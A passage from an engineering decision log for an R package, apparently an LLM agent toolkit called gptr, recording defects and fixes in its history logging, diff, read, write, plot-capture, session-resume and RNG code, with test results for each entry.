   one at each break inside a statement) or the next line starts with `}` or the word `else`.
   The first version (review round 2) used only the braces, so `{ if (x) y else z }` was logged
   as `{ if (x); y; else z }`, which is not the code typed. Applied without the cut to every
   function body of base, stats, utils, methods, tools and graphics that deparses to 2 to 120
   lines (2,891), the one-line text parses to the same expression as the multi-line deparse
   for all of them; the first rule failed for 2,260 (`task4-fix2-probe-corpus.log`,
   `task4-fix2-probe-corpus-oldglue.log`).
4. **The entry is valid UTF-8 before it is cut** (IC-62; conventions section 4: console input
   passes `as_utf8()`). The deparsed text goes through Task 2's `env_text()`, so `nchar()` and
   `substr()` count characters in every locale.
5. **Registration follows R's callback list, not a flag.** The plan registered only while its
   own `active` flag was FALSE. After R dropped the callback (item 1), or the user removed it by
   position (`removeTaskCallback(1)`), the flag stayed TRUE, and a new session never registered
   the callback again. `user_log_start()` now checks `getTaskCallbackNames()`, and
   `user_log_stop()` removes every callback named `gptr_history`.
6. **`gptr:::gptr(...)` and `"gptr"::"gptr"(...)` are filtered** like `gptr::gptr(...)`. They
   too are calls of `gptr()`. Other functions of the package, such as `gptr::gptr_last()`, are
   still logged.
7. **Session ids are checked** (04 section 2.2). `user_log_start(NULL)` registered a callback
   with no session to release it, and `user_log_start(NA)` stored an `NA` session. Both now
   signal `gptr_error_invalid_argument` before anything changes.
8. **An error from `deparse()` becomes a note** (review round 1). `deparse()` signals an error
   on two kinds of input that the parser accepts and that evaluate without error. Both made R
   print the error at the prompt and drop the callback (`task4-fix1-probe-before.log`).
   - In a UTF-8 locale (the default on macOS, Linux and Windows R >= 4.2), a backtick name
     whose `\x` escapes are not UTF-8: `` `\xff` = 1 ``, `` x = list(`\xfe` = 1) ``,
     `` f = function(`\xff`) 1 ``. The error is "invalid multibyte string at '<fe>'".
   - A chain of calls `f(1)(1)...(1)` typed as a whole top-level expression, where `f` returns
     itself. With an 8 MB C stack, `deparse()` fails its C stack check from about 800 calls,
     far below the 5,000-call cap of item 2 (`task4-fix1-probe-shapes.log`). A bigger stack
     only moves the threshold.
   `user_log_text()` now runs the text step (`user_log_line()`, the former body) in
   `tryCatch()`, and any error there is logged as `<expression that cannot be deparsed>`. Its
   frame holds only `expr`, never the callback's `value`, so R3 holds: the copy row still
   counts 0 copies. A probe of other parser shapes found no other failure: `- - a`, `!!a`,
   `a$a`, `a[1][1]`, `~ ~ a`, pipes and `+` deparse at 4,999 levels; `^`, `=`, `function()` and
   `if` do not parse at 4,999 levels and deparse at 2,000 (`function()` at 1,000; it does not
   parse at 2,000).

Copy safety (R1-R3). A new fresh-process row in `test-copy-eval.R` runs three top-level lines
that hand `big` itself to the live callback as `value`. The next edit is in place, with 0 copies.
A negative control with the same script (`task4-copy-negative-control.log`) shows a callback
that keeps the values it is handed costs 1 copy, which the row would catch.

Validation: `progress/P09.md`, Task 4. Ten blocks (62 expectations) and one copy row were added
to the plan's tests, which are unchanged. Against the plan-literal source the first seven added
blocks gave `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 24 ]`. The two blocks of item 8 and its line in
the fresh-process block failed against the source before item 8 (`[ FAIL 5 | WARN 0 | SKIP 0 |
PASS 41 ]`, `task4-fix1-red.log`). The review round 2 expectations (the glue of item 3, the
argument names of item 1) failed against the source before that round (`[ FAIL 6 | WARN 0 |
SKIP 0 | PASS 54 ]`, `task4-fix2-red.log`). The review round 3 block (the defaults of item 2)
failed 3 of its 8 expectations against the source before that round (`[ FAIL 3 | WARN 0 |
SKIP 0 | PASS 71 ]`, `task4-fix3-red.log`). Final `^env-history$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 74 ]`, the same under `LC_ALL=C`. `^copy-eval$`: 8 passes.

## D-046 - P10 diff engine: collision-free no-newline keys, validated diff_unified() arguments, a clamped context, O(D^2) Myers memory, linear hunk rendering and an O(n log n) LIS (2026-10-04)

P10 Task 3's plan-literal `R/tool-diff.R` had six defects, all reproduced against that source:
1. **The no-newline sentinel could collide.** `diff_unified()` keyed a last line lacking its
   newline as `paste0(line, "\001<no-eol>")`. A line that has its newline and ends in that text
   matched it, so `diff_unified("f", "x\001<no-eol>\n", "x")` returned `character()`, which
   claims two different texts are equal.
2. **`diff_unified()` did not validate its arguments.** An `NA` text rendered as `-NA`, and a
   vector text stopped with a base error.
3. **A large `context` overflowed.** `context` near `.Machine$integer.max` overflowed
   `2L * context + 1L`.
4. **Myers memory was O(D * (n + m)).** The Myers trace kept a full copy of `v` for each of up to
   257 rounds: a 100,000-line total rewrite grew the heap by 401.8 MB, and 1,000,000 lines would
   have needed about 4 GB. The plan's backtrack loop `seq.int(d, 1L, by = -1L)` also errors at
   d = 0.
5. **Rendering was quadratic in the number of hunks.** 20,000 hunks over 200,000 lines took
   16.5 s.
6. **The LIS step was quadratic on reordered input** (review round 1). The plan finds each
   anchor's pile with `findInterval()`, which checks on every call that its `vec` is sorted, an
   O(L) scan of the tails. When anchors are out of order but have a long increasing run (any
   moved line or block in a large file) the tails grow with the input and the step costs
   O(n * L): moving a 1,000-line block in a 200,000-line file took 9.6 s in `diff_lines()`, and
   `diff_lis(c(2:200000, 1L))` 9.5 s (red run). The `checkSorted` argument that skips the check exists
   only from R 4.5.0; the package depends on R >= 4.2.0.

These affect `edit` (Task 6), P15's document writer and P16's checkpoints, which diff whole
files.

The fixes:
- Lines are compared as integer codes, and a last line without its newline gets the negated code.
- `diff_unified()` raises `gptr_error_invalid_argument` for a bad `path`, `old`, `new` or
  `context`.
- `context` is clamped to the edit script's length.
- `v` spans diagonals -(D + 1) .. D + 1, and each round keeps only its window -d .. d, so memory
  is O(D^2). The backtrack loops over `rev(seq_len(d))`.
- `diff_hunks()` is vectorised over the rows of all hunks at once.
- `diff_match()` keeps its stack in four integer vectors with a top index and vectorised pushes.
- `diff_lis()` keeps the tails in vectors of length n with a length counter: a value above the
  last tail is appended in O(1), any other finds its pile by binary search, so the step is
  O(n log n). The plan text's "through `findInterval()`" is replaced; the result is the same.

A diff whose budget is smaller than its truncation notice is now documented as the notice alone.
No signature, class or output format changed. Wherever the plan-literal source worked, the
outputs are identical: a differential check of 3,000 generated pairs, 60,000 `diff_lines()`
calls, 24,000 `diff_unified()` calls and 7,988 `diff_myers()` calls found 0 differences. The new
`diff_lis()` returned the same indices as the `findInterval()` version on 5,000 generated inputs
(permutations, repeats, reversals, rotations), and `diff_lines()`/`diff_ops()` were identical on
2,000 generated pairs with moved lines.

Validation: `progress/P10.md`, Task 3. Nine blocks (149 expectations, 118 of them from a `git
apply` property test over 60 generated pairs with context 0, 1 and 3 and every final-newline
combination) were added to the plan's 6 blocks, which are unchanged. Two of them came with
review round 1: the LIS against an O(n^2) reference on 300 generated inputs, and a timing block
(a 1,000-line block moved in 200,000 lines, under 5 s; red `[ FAIL 2 | WARN 0 | SKIP 0 |
PASS 566 ]` at 9.6 s and 9.5 s before the fix).
- Against the plan-literal source the test file before review round 1 gave
  `[ FAIL 7 | WARN 1 | SKIP 0 | PASS 543 ]`.
- Final `^tool-diff$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 568 ]` (the plan's 419 plus 149), the
  same under `LC_ALL=C`.

## D-047 - P09 r_env probe: LinkingTo never makes a package unloadable, a loaded namespace is installed at its loaded version, lookups by name, no warning for a directory that is not an installed package (2026-10-04)

P09 Task 5's plan-literal `env_probe_packages()` (`R/env-probe.R`) was changed in the three ways
below. Each was found by a probe of the plan-literal source
(`dev/.validation/P09/task5-probe-plan-literal.log`). The registry, `env_probe_deps()`,
`env_probe_session()`, `env_probe_render()`, the `<r_env>` grammar and the cache are unchanged.

1. **Only Depends and Imports decide "Installed but NOT loadable"; LinkingTo does not.** The plan
   text counts LinkingTo as a hard dependency, but 04 section 7.9 and 03 sections 7.3 and 7.5
   define the line as packages that are installed but not loadable, and R reads LinkingTo only
   when it compiles a package. A check (`task5-linkingto-check.R`, `.log`) installed two R-only packages
   into a temporary library and recorded a dependency on a package that is not installed: with
   LinkingTo the package loads and attaches in a child Rscript; with Imports (and its NAMESPACE
   import) loading fails ("there is no package called"). A library holding binaries installed
   without their header-only LinkingTo packages would otherwise tell the model not to
   `library()` working packages. No installed package on the development machine has such a
   missing LinkingTo package (probe B: 0).
2. **A loaded namespace is installed at its loaded version, and every lookup is by name.** The
   plan named the paths of one vectorised `find.package()` by their `basename()` and read
   `Meta/package.rds` from each. A namespace loaded from a source tree (`pkgload::load_all()`)
   breaks both: its directory need not carry the package name (a clone named `seurat` or
   `p09devpkg-main`), and it has no `Meta/package.rds`. The plan-literal probe reported such a
   loaded package as "Not installed" (probe C). With `lib = NULL`, a package whose namespace is
   loaded now takes `getNamespaceVersion()` (guarded by `isNamespaceLoaded()`, so nothing is
   loaded) and has nothing missing; any other package is looked up with one `find.package()` per
   name, and the dependencies through `env_probe_found()`, one `find.package()` per name,
   memoised for the dependencies the probed packages share.
3. **No warning for a directory that is not an installed package.** `find.package()` accepts a
   library directory with only a `DESCRIPTION`, but `library()` refuses it ("is not a valid
   installed package"). The plan's `tryCatch(readRDS(...), error = )` let the `gzfile()` warning
   for the missing `Meta/package.rds` escape. The file's existence is now checked first, and such
   a directory still counts as not installed. The same rule covers dependencies
   (`env_probe_path()`, shared by `env_probe_packages()` and `env_probe_found()`):
   `loadNamespace()` refuses such a directory ("does not have a namespace"), so a package that
   imports it is "Installed but NOT loadable" with it as the missing dependency, and the section
   no longer lists the package under Installed and its dependency under Not installed (review
   round 1). With `lib = NULL` a loaded dependency counts as found, as a loaded probed package
   does, so a dependency loaded from a source tree is not reported missing.

Known limits, unchanged from the plan's design: the out-of-process load probe is not run, so a
package whose compiled library cannot be loaded is listed as installed (BPCells on the
development machine: "unable to load shared object" in a child process); only direct
Depends/Imports are checked, without their version requirements; and a pathologically broken
library can exceed the section's 450-token budget (probe D3: 3,580 tokens with all 36 packages
each missing 40 dependencies; 351 with each missing one), which `prompt_freeze()` truncates at a
line boundary with a diagnostic (04 section 7.7).

Validation: `progress/P09.md`, Task 5. Four blocks (15 expectations) were added to the plan's 5
blocks (16 expectations), which are unchanged; the plan's `fake_lib()` helper gained `...` for
extra DESCRIPTION fields. Against the plan-literal source the first three added blocks gave
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 20 ]` (`task5-red-adaptations.log`); the fourth (dependencies,
review round 1) gave `[ FAIL 2 | WARN 0 | SKIP 0 | PASS 29 ]` against the round-0 source
(`task5-fix1-red.log`). Final `^env-probe$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 31 ]`
(`task5-fix1-green.log`), the same under `LC_ALL=C` (`task5-fix1-green-clocale.log`).

## D-048 - P10 read engine: BMP needs a DIB header, magick failures are notes, whole characters, integer-range offsets, the token-limit notice, BOM-aware and late-byte decoding, NUL means binary, bounded streaming windows, an LRU index cache keyed by the tool path (2026-10-04)

P10 Task 4's plan-literal `R/tool-read.R` passes the plan's 12 blocks (80 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task4-probe-plan-literal.log`,
`task4-probe-giant-line-plan-literal.log`, `task4-probe-clocale-index.log`):
1. **Any text file starting with `BM` was a BMP.** The sniff checked only `BM` and 26 bytes, so
   `BMI notes: ...` went to magick, which stopped `read` with `ImproperImageHeader`. Pi's
   `mime.ts` needs a plausible DIB header (report 01 section 2.3 and its verified port in
   section 5): `bmp_header_ok()` checks the file size, pixel offset, a core (12) or info
   (40-124) header, one plane and a standard bit depth.
2. **A magick decode error stopped `read`.** An image whose magic bytes pass but that magick
   cannot decode is now omitted with Pi's note `[Image omitted: could not be converted to a
   supported inline image format.]` (`process_image_magick()` runs under `tryCatch()`).
3. **`image_dims()`**: JPEG fill bytes (`FF FF`) before a marker were read as a segment length
   (dimensions lost); a BMP core header has 16-bit dimensions.
4. **Offsets.** `format(100000)` is `1e+05`, so the error read `Offset 1e+05 is beyond end of
   file`; it is now `Offset 100000 ...` (Pi prints the number). `offset = 1e10` was coerced to
   `NA` with a warning and then a base error; `offset` and `limit` are now checked within the
   integer range (`gptr_error_invalid_argument`), and the window end is computed in double, so
   `limit = .Machine$integer.max` no longer overflows `offset + n - 1L`.
5. **A long line cut on a character boundary lost a whole character.** `read_line_prefix()`
   stripped the last complete multi-byte character whenever the cut fell after it (51,198
   instead of 51,200 bytes of `é`). The new `utf8_trim_partial()` drops only an incomplete
   final sequence.
6. **A first line cut by the token budget claimed the 50 KB cap** (`[Line 1 is 2.0KB, exceeds
   the 50.0KB limit; ...]` for `budget_tokens = 10`). It now names the cause: `exceeds the 10
   token limit`.
7. **The in-memory reader ignored a UTF-8 BOM when deciding the encoding**, so a BOM file with
   invalid bytes read as CP1252 while `decode_raw()` (used by write and edit) says lossy UTF-8.
   It now calls `decode_raw()` on the bytes with their BOM.
8. **Streaming-reader decoding (files above 16 MiB).** The encoding came from the first 64 KB
   minus 4 bytes, which can still end inside a character: a valid file then decoded as CP1252
   (mojibake in every window) or got a false lossy notice. The head is now cut back to a
   character boundary. A CP1252 gap byte (`0x81`) in a later window gave the line `"NA"`; such a
   window now falls back to latin1. Invalid UTF-8 in a later window now sets the lossy notice.
9. **NUL bytes past the 8,000-byte sniff.** In a large file, a NUL in the head past byte 8,000
   raised `The file contains NUL bytes` (`invalid_argument`) and a NUL in a later window a base
   `embedded nul` error or a cut line. In a file up to 16 MiB, an embedded NUL made
   `rawToChar()` fail (binary), but trailing NULs are silently dropped by `rawToChar()`: the
   file then showed as text without them, or, when it was not valid UTF-8, `decode_raw()`
   raised `The file contains NUL bytes` (review round 1). All now give the binary notice: the
   in-memory reader looks for a NUL anywhere with `grepRaw()` (ripgrep's rule, report 11
   section 2.2), the streaming reader in its 64 KB head and in the window.
10. **The streaming reader was not bounded in memory.** It kept every byte up to the end of the
    window, so a giant line was read whole: a 40 MB single-line file peaked at 45.9 million
    Vcells (about 367 MB) against 8.4 million after the fix (the package's baseline). It now
    keeps at most `read_window_cap` (102,400) bytes of a window through `read_span()`; the line
    cut there is kept in part, past the 50 KB cap, so `truncate_lines_head()` reports the
    truncation, and the length of a first line longer than the cap is measured by scanning
    (`first_bytes`). `read_text_window()` gained `cap = Inf` (passed by `read_core()`).
11. **The sparse-index cache** keyed entries through P01's `path_key()`, which fails with
    "unable to translate" for a non-ASCII path in a C locale, so a large file in such a
    directory could not be read there. It also evicted the alphabetically first keys and kept
    entries of older versions of a file. It now keys on the normalised tool path, keeps a list of
    at most 8 entries compared by value, evicts the least recently used and drops an older
    version's entry when a file is indexed again. `path_key()` is no longer consumed.

No signature, class or text of `read_file()`, `read_lines_value()` or `gptr_lines` changed,
except the token-limit wording of item 6. The internal additions are `utf8_trim_partial()`,
`bmp_header_ok()`, `process_image_magick()`, `read_span()`, `read_window_cap`, the `cap`
argument of `read_text_window()` and `read_window_big()`, the `first_bytes` field of a window and
`read_core()`'s `first_line_limit`.

Validation: `progress/P10.md`, Task 4. Fifteen blocks (49 expectations) were added to the plan's
12 blocks, which are unchanged. Against the plan-literal source the final test file gave
`[ FAIL 23 | WARN 0 | SKIP 0 | PASS 90 ]` (`task4-fix1-red-plan-literal.log`) and, under
`LC_ALL=C`, `[ FAIL 23 | WARN 1 | SKIP 0 | PASS 89 ]` (`task4-fix1-red-plan-literal-clocale.log`;
the non-ASCII index block is red in both locales, through `unable to translate` under `LC_ALL=C`).
Final `^tool-read$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 129 ]`, the same under `LC_ALL=C`.

## D-049 - P09 plot capture: while no human can see a device, a default device the code opens is offscreen too; a reused device number starts a new page; plot_png() keeps no PNG (2026-10-04)

P09 Task 6's plan-literal `R/eval-plots.R` was changed in the three ways below. Each was found by
a probe of the plan-literal source (`dev/.validation/P09/task6-probe.R`,
`task6-probe-plan-literal.log`; the plan-literal file is kept as
`task6-eval-plots-plan-literal.R`). `plot_png()`'s signature and result, the PNG size and
devices, the visual-change and prefix heuristics, the low-level merge (`fig.keep = "high"`) and
the plan's six test blocks are unchanged.

1. **The `device` option opens pdf(NULL) while no human can see a device (IC-67).** The plan
   opened one `pdf(NULL)` at `plot_begin()`. When the evaluated code closed it (`dev.off()`,
   `graphics.off()`, a common model pattern after a plot) and drew again, R opened its default
   device: `Rplots.pdf` in `getwd()` under Rscript, with its display list off, so the later
   plots were not captured either. The same happened in device mode without a human after the
   code closed the user's device. `plot_close()` then closed whatever device had reused the
   number of the private one. 04 section 15 IC-67 and 03 section 6.12 ask for no `Rplots.pdf` in
   the working directory. R opens the `device` option for every implicit device (`plot()`,
   `par()`, `layout()`, grid drawing) and for `dev.new()`; `par()`, `layout()` and grid drawing
   without `grid.newpage()` run no plot hook, so the hooks of Task 8 cannot cover it. Now
   `plot_begin()` sets `options(device = <closure over the plot state>)` in "capture" mode and
   in every mode when no human is present; the closure opens another
   `pdf(NULL)` with the display list enabled (`plot_open_offscreen()`), whose number joins
   `ps$our_devs`. `plot_close()` restores the option first and closes every device in
   `ps$our_devs` that is still open. The option is set last in `plot_begin()`, so a failure
   before it cannot leave it changed. With a human present in "auto" mode the option is not
   touched: the human's default (screen) device opens as before. In "capture" mode
   `plot_capture()` skips the user's devices open at `plot_begin()` (`ps$devs0`) but not a device
   of `ps$our_devs`: after the code closed the user's device and the private one
   (`graphics.off()`), R opens the next offscreen device at the user's old number, and its plots
   are captured too (review round 1; the plan compared the number with `ps$our_dev` only).
2. **A device number R reuses starts a new page.** `ps$last_dl` and `ps$last_k` are keyed by the
   device number. A new offscreen device clears both for its number, so a page on it is never
   treated as a low-level addition to the closed device's page. Without this, `plot(1:3)`,
   `dev.off()`, `plot(1:3); abline(h = 2)` replaced the first recording instead of adding the
   second plot (`task6-mutant-noclear.log`). `plot_close()` also drops `ps$last_dl` (capture has
   ended; the recordings themselves are dropped by `plot_render_all()` as before).
3. **`plot_png()` keeps no PNG.** Its PNG is only the source of the block's bytes, but the
   plan left one file per call in `<workspace>/cache/tmp`, also when the replay failed (probe E).
   It is now removed on exit. `plot_render_all()` removes the PNG of a replay that failed (its
   other PNGs are the paths the `plot` events carry and stay, as planned).

Known limits, unchanged from the plan's design: in "capture" mode with user devices open, code
that closes the private device draws on the device R makes current, a user's device, which is
not captured; a user's file device opened with its display list off holds no display list before
`plot_begin()` enables it, so a low-level addition on it is recorded alone (`plot_render_all()`
gives `NA` for it when the replay fails); a device the code opens explicitly (`png()`) at a number
the private device used before is closed by `plot_close()`; R offers no public way to tell
devices apart beyond their numbers (`dev.displaylist()` is internal, report 12 A5).

Validation: `progress/P09.md`, Task 6. Three blocks (20 expectations) were added to the plan's 6
blocks (32 expectations). The final test file against the plan-literal source gave 10 failed and
42 passed expectations (`task6-red-adaptations-final.log`). Review round 1 added two blocks (14
expectations): the capture-mode device at a reused user number failed 2 before its fix
(`task6-fix1-red.log`), and a mutant of `plot_render_all()` that keeps a failed replay's PNG
fails 1 (`task6-fix1-mutant-nounlink.log`). Final `^eval-plots$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 66 ]` (`task6-fix1-green.log`), the same under `LC_ALL=C` with
`_R_CHECK_SCREEN_DEVICE_=stop` (`task6-fix1-green-clocale.log`).

## D-050 - P06 store reader and resume: entries that parse but cannot be read are skipped, ids are checked before they name anything, mode, model and frozen prompt come from the active path, a failed or interrupted rebuild leaves nothing registered, a rebuilt fork's usage is its own, a time that is not ISO 8601 falls back (2026-10-04)

P06 Task 13's literal reader and `store_rebuild()` are changed in six ways. Task 14's
`session_replay_new()`, P15's replay, P16's rewind and every `gptr_resume()` caller consume them:

1. **`store_read()` also skips a line that parses but is not a readable entry.** These are
   objects without a string `type` or entry id (one non-empty string of at most 10000 bytes),
   and messages that P01's `msg_from_json()` refuses. A `parentId` that cannot be an entry id
   counts as missing, so the entry is re-parented to the previous one. In the plan, any of these
   made the whole file unreadable: `assign(NULL, ...)` failed, `msg_from_json()` failed, a
   numeric `type` selected a `switch()` branch by position, or `exists()` failed. Contract 04
   section 7.6 and IC-59: the reader "skips any unparsable line with a diagnostic". They count in
   the same single `torn_line` diagnostic.
2. **Ids are checked before they name a registry entry, a file or a pattern.**
   - `store_rebuild()` refuses a header id that fails `check_session_id()`'s rule, before
     `session_by_id()`, with `gptr_error_invalid_argument` (`arg = "x"`). The plan raised base R's
     unclassed `get0()` error for a non-string id, and `session_new()`'s refusal (`arg =
     "opts$id"`) for a path-like one.
   - `store_find()` returns `NULL` for a string that cannot be a session id, and matches file
     names with `endsWith()`. With the plan's regex built from the id, `gptr_resume(".*")`
     resumed an arbitrary stored session.
   - `gptr_resume(<directory>)` is `gptr_error_invalid_argument`, not base R's `readLines()`
     error.
   - The new helper `session_id_ok()` holds `check_session_id()`'s rule, which is unchanged.
3. **The mode, the model and the frozen prompt of a rebuilt session come from its active path**
   (root -> the last entry, 04 section 6.5).
   - The plan read the mode from every entry of the file, so a sibling branch's later mode change
     decided it.
   - The frozen prompt is now the last `gptr.frozen` entry on the path, as Task 12's
     `fork_frozen()` and P07's planned restore read it. The plan took the first one in the file,
     which differs after an IC-52 refreeze or on a sibling branch.
   - `rebuild_model()` also reads the `model` of the path's `gptr.frozen` entry (the model of the
     first run), which later `model_change` entries and answers override. A session stopped
     before its first answer keeps its model instead of resuming as `"unknown/unknown"`.
4. **A rebuild that fails after `session_new()` leaves nothing registered.** The plan undid the
   registration only for a `store_open()` failure. Any other error (a usage record that P05's
   `usage_row()` refuses, for example) left a live session with the recorded id and no store,
   which the next `gptr_resume()` returned unlocked and `gptr_last()` pointed at. Now every step
   after `session_new()` runs in `rebuild_fill()`. Until it completes, an `on.exit()` handler
   (`rebuild_undo()`, under `suspendInterrupts()`) releases a lock this process took, calls
   `live_forget()` and restores `the$last`. This covers an interrupt (Esc, Ctrl-C) as well as an
   error, and the condition propagates unchanged. Architecture 03 section 6.4 records
   interruption with `on.exit()`, never with an exiting `tryCatch()`; a `tryCatch(error =)` (the
   first version of this fix) let an interrupt through and left the half-built session behind.
5. **A rebuilt fork's usage rows are its own requests.** The plan's `rebuild_usage()` read every
   assistant message of the file. A fork's file starts with the source path that `store_fork()`
   copied (written first by `store_open()`, ids kept, up to the header's `gptr.forkOf.entry`), so
   a resumed fork reported the source's requests, under the source's recorded request ids, as its
   own: `$usage`, `$cost` and `gptr_usage()` were overstated, and `gptr_usage()` over all live
   sessions (deduplicated by request id, the first session in id order kept) could credit the
   source's requests to the fork. Contract 04 section 6.5: nothing live is shared with a fork,
   usage included; a live fork's usage holds only its own requests (Task 12). The new
   `rebuild_own()` leaves out the copied prefix. A fork at turn 0 copies nothing and has no
   `forkOf.entry`; a `forkOf.entry` missing from the file (a skipped line) leaves the entries as
   they are.
6. **A time that is not ISO 8601 falls back instead of failing.** `iso_ms()` returned `NA` for a
   string in another format, or for a non-string, so the callers' `%||%` fallbacks never applied.
   One hand-edited assistant entry time then made P05's `usage_row()` refuse the start time and
   the whole session could not be resumed, against item 1's aim; a header time gave
   `d$created = NA` and an `NA` `created` in `gptr_sessions()`. `iso_ms()` now returns `NULL` for
   anything but one parsable ISO 8601 string. A usage row's start time falls back to the
   message's own epoch-ms time, then to the epoch; `created` falls back as for a missing time.

Validation: `progress/P06.md`, Task 13 (`test-session-store.R`). Four blocks (31 expectations)
were added to the plan's tests, then, in review round 1, two blocks and an interrupt variant of
the undo block (15 expectations). Against the plan-literal source, the first four blocks gave 10
failures and 230 passes, all failures in the added blocks (`task13-literal.log`). The review
round's additions failed 9 times against the first version of this fix
(`task13-fix1-red.log`). Final `^session-(live|store)$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 270 ]`
(`task13-fix1-focused.log`).

## D-051 - P10 write engine: a file without a line ending is written as given, the 1 MiB sample ends on a whole character, a new file gets the umask's mode, ".." links climb as the kernel does, 40 links are followed, non-ASCII paths in a C locale, an unreadable file is written verbatim, a read-only file is refused (2026-10-04)

P10 Task 5's plan-literal `R/tool-write.R` passes the plan's five blocks (20 expectations) but had
these defects, each reproduced against that source (`dev/.validation/P10/task5-probe-plan-literal.log`,
`task5-probe-plan-literal-clocale.log`; the plan-literal file is kept as
`task5-plan-literal-tool-write.R`, the probe script as `task5-probe.R`):
1. **A file without a line ending had its content's line endings rewritten.** An existing empty
   or one-line file counted no CRLF, so its "dominant" line ending was LF and `a\r\nb\r\n`
   became `a\nb\n`. Such a file has no convention to keep: `write_conventions()` now returns
   `eol = "asis"` and the content is written as given (Pi, report 01 section 2.4); its encoding
   and BOM are still kept. `details$eol` is `"asis"` there, the value new files already had.
2. **A UTF-8 file whose 1 MiB sample ended inside a character read as CP1252.** With few
   non-ASCII characters before the cut, `decode_raw()` counted the cut sequence as invalid bytes
   and chose CP1252, so `é` was written as the single byte `0xE9` into a UTF-8 file and a CJK
   character was refused with `cannot be represented in the file's encoding (CP1252)`. A sample
   shorter than the file (without a BOM or with a UTF-8 BOM) is now cut back to a whole character
   with Task 4's `utf8_trim_partial()` (report 11 section 2.2's rule for the read head).
3. **Every new file was private (0600).** P01's `write_atomic()` creates its files with mode 0600
   on purpose, for gptr's own state (`progress/P01.md`, "Independent review corrections after
   Task 8"). Pi's `writeFile()` and editors create 0666 minus the umask (0644 under umask 022).
   `write_bytes_keep_mode()` now applies `Sys.chmod(p, "0666", use_umask = TRUE)` to a file it
   created (not on Windows); an existing file keeps its mode as before. Task 6's patch `Add File`
   uses the same function and inherits this.
4. **A relative link that climbs with ".." named the wrong file.** `resolve_link_target()` joined
   the link text to the link's directory lexically, so `proj/linkdir/f.txt -> ../shared/f.txt`
   with `proj/linkdir -> other/real` resolved to `proj/shared/f.txt` instead of the kernel's
   `other/shared/f.txt`: the write created `proj/shared/` and a new file and left the real target
   unchanged. The same held for an absolute link text and for a ".." after a symlinked component
   inside the link text (`abs.txt -> <td>/proj/linkdir/../shared/f.txt`). A link text with a ".."
   segment, relative or absolute, is now joined to the link's directory and handed to the new
   `tool_path_physical()`, which resolves the longest existing leading part of the joined path
   with `normalizePath()` (the kernel's order: each link before the ".." after it) and leaves the
   rest, which does not exist yet, to the lexical `tool_path_norm()`. A dangling link into a
   directory that does not exist yet (`<td>/proj/linkdir/../new/g.txt`) therefore creates
   `other/new/g.txt`, as `mkdir -p` on the link text would. Link texts without ".." keep the
   lexical join, so `details$path` keeps the caller's spelling (independent review round 1).
5. **The hop limit was off by one.** The loop followed 40 links but never examined the 40th
   target, so a chain of exactly 40 links (Linux's MAXSYMLINKS) was refused with `ELOOP`. Now 40
   links are followed and the 41st is refused; a loop still gives `ELOOP`.
6. **Non-ASCII paths failed in a C locale.** `dirname()` of a marked UTF-8 non-ASCII path raises
   `unable to translate ... to native encoding` and `file.path()` turns it into `<U+00E9>`
   escapes, so `write_file("déjà/fü.txt", ...)` failed under `LC_ALL=C` and a relative
   link there would have been resolved to an escaped path. The new `tool_path_dir()` takes
   `dirname()` of the unmarked bytes (`fs_path()`) and re-marks the result UTF-8; link texts are
   joined with `paste0()`.
7. **A file that may be written but not read (mode 0200) raised a base error** (`cannot open the
   connection`, with a warning) while reading the sample. Its conventions are unknown, so it is
   now written as given, like a binary file, and keeps its mode (Pi's `writeFile()` succeeds
   there too).
8. **A read-only file was replaced silently.** `write_atomic()` renames a temporary file over the
   target, which needs only a writable directory, and `write_bytes_keep_mode()` then put the 0444
   mode back, so `write` rewrote a file that Pi's `writeFile()` refuses with `EACCES` and that
   Task 6's `edit_compute()` refuses with `Could not edit file: <path>. Error code: EACCES.`
   `write_file()` now checks `file.access(target, 2L)` for an existing (link-resolved) target and
   raises `EACCES: permission denied, open '<path>'` (`gptr_error_invalid_argument`, Node's text,
   the absolute path as given) before encoding anything; the file is left unchanged. A file in a
   read-only directory still fails in `write_atomic()` with `gptr_error_doc_write`
   (independent review round 1).

The `EISDIR` check also runs on the resolved target, so a resolution that lands on a directory is
refused instead of failing in the rename. Interfaces are unchanged: `write_file(path, content)`
and its result, `resolve_link_target(p, max_hops = 40L)`, `write_bytes_keep_mode(target, bytes)`
-> `invisible(existed)`. Internal additions: `write_sniff_bytes`, `tool_path_dir()`,
`tool_path_physical()`.

Validation: `progress/P10.md`, Task 5. Seven blocks (32 expectations) were added to the plan's
five blocks, which are unchanged. Against the plan-literal source the test file of that time gave
`[ FAIL 14 | WARN 0 | SKIP 0 | PASS 24 ]` (`task5-red-plan-literal.log`; every failure is in an
added block). Review round 1 added two blocks (12 expectations) for items 4 and 8, red before the
fix (`[ FAIL 8 | WARN 1 | SKIP 0 | PASS 55 ]`, `task5-fix1-red.log`). Final `^tool-write$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 64 ]`, the same under `LC_ALL=C`.

## D-052 - P09 agent RNG streams: rng_swap() also restores R's generator kind when the user had a seed; the word 2^31 is stored as NA without a warning (2026-10-04)

P09 Task 7's plan-literal `R/eval-core.R` was changed in the two ways below. The signatures of
`rng_seeds()` and `rng_swap()`, the derivation of IC-61 (24 bytes of sha256, modulo m1 and m2,
two's complement), the state fields `seed` and `id`, the no-seed branch and the plan's 4 test
blocks are unchanged.

1. **The user's generator kind is restored when the user had a seed (review round 1).** R keeps
   the kind internally. The plan put back the user's vector, which is identical, but left the
   agent's L'Ecuyer-CMRG as R's internal kind until R next read the variable. A user who then
   removed `.Random.seed` (`rm(list = ls(all.names = TRUE))`) got L'Ecuyer-CMRG from
   `set.seed(42)`: `runif(1)` gave 0.1738 instead of 0.9148. A later swap made without a seed
   then read L'Ecuyer-CMRG as the user's kind and kept it in force. This is the defect the plan
   fixes for the no-seed branch (Self-review ambiguity 16), on the other branch. Now, after the
   vector is put back, `stats::rbinom(1L, 0L, 0.5)` makes R read the kind from the user's full
   vector and draws nothing, and the vector is assigned again so it stays identical. The kind is
   not re-synced from the length-1 kind code, because that path (RNG_Init) drops a cached
   Box-Muller normal; the full vector keeps it. The call is wrapped in
